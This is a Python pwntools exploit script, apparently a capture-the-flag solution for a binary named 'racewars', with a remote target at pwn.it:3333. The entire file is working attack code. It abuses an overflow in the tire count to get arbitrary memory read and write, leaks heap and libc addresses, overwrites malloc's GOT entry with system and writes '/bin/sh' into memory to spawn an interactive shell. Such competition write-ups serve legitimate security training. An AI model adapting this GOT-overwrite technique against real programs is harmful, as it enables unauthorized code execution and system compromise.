#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
from parse import *
context.log_level="debug"
pwn_file="./racewars"
elf=ELF(pwn_file)
libc=elf.libc

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("pwn.it",3333)
    pid=0

heap_address=0
def debug():
    log.debug("heap address:0x%x"%heap_address)
    log.debug("libc address:0x%x"%libc.address)
    log.debug("process pid:%d"%pid)
    pause()

def add_tires(pair):
    conn.sendlineafter("CHOICE: ","1")
    conn.sendlineafter("how many pairs of tires do you need?\n",str(pair))

def add_chassis(id):
    conn.sendlineafter("CHOICE: ","2")
    conn.sendlineafter("mitsubishi eclipse\n",str(id))

def add_engine():
    conn.sendlineafter("CHOICE: ","3")

def add_trans(id):
    conn.sendlineafter("CHOICE: ","4")
    conn.sendlineafter("5-speed Manual(1) or 4-speed Automatic(0) transmission?",str(id))

def modify_tires(id,value):
    conn.sendlineafter("CHOICE: ","1")
    conn.sendlineafter("CHOICE: ",str(id))
    conn.recvuntil(": ")
    conn.sendline(str(value))

def modify_trans(idx,value):
    conn.sendlineafter("CHOICE: ","4")
    conn.sendlineafter("which gear to modify? ",str(idx))
    data=conn.recvuntil(",")
    r=search("gear ratio for gear {:d} is {:d}",data)
    conn.sendlineafter("what?: ",str(value))
    conn.sendlineafter("(1 = yes, 0 = no)","1")
    return r[1]

add_tires(0x8000000)
add_trans(0)
add_chassis(1)
add_engine()

# make gears = 0xffffffffffffffff
modify_tires(1,-1)
modify_tires(2,-1)
modify_tires(3,-1)
modify_tires(4,-1)

# edit any address
for i in range(8):
    heap_address|=modify_trans(-0x20+i,0)<<(i*8)

heap_address=heap_address-0x98
start_address=heap_address+0xa0

# leak libc
temp=0
for i in range(8):
    temp|=modify_trans(elf.got["__libc_start_main"]+i-start_address,0)<<(i*8)

libc.address=temp-libc.sym["__libc_start_main"]

system=p64(libc.sym["system"])
for i in range(8):
    modify_trans(elf.got["malloc"]+i-start_address,ord(system[i]))

data="/bin/sh\x00"
for i in range(8):
    modify_trans(0x603a00+i-start_address,ord(data[i]))

conn.sendlineafter("CHOICE: ","5")
conn.sendlineafter("CHOICE: ","1")
conn.sendlineafter("how many pairs of tires do you need?\n",str(0x603a00/0x20))

conn.interactive()

